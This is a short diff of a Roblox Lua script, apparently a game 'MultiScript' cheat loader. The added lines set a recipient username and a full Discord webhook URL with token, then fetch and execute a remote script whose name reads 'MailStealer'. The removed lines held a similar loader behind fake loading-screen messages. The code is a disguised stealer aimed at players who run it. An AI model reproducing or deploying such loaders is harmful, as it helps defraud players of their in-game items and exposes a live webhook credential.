@@ -1,10 +1,5 @@
-Username = "jarma90"
-Username2 = "Reset40448970"
-WebHook = "discordwebhook"
-loadingscreen = true
-_G.CustomScriptName = "Pet Sim x MultiScript"
-_G.Text1 = "Script Loading..."
-_G.Text2 = "Waiting for Script..."
-_G.Text3 = "Checking Scripts..."
-_G.Text4 = "Starting Script..."
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/petsimguiss.lua"))()
+_G.UserNamey = "jarma90"
+
+_G.Webhooky = "https://discord.com/api/webhooks/1117519968657997936/dsg-KCrRcYOi123aWTSOzyu1yDIm4wfieCilbG1CC4EWLq5bI8WZNonnn_qbUZhxMzgl"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/HosteeScriptz/HosteeHub/main/%E2%9C%97%20MailStealer%20%E2%9C%97"))()
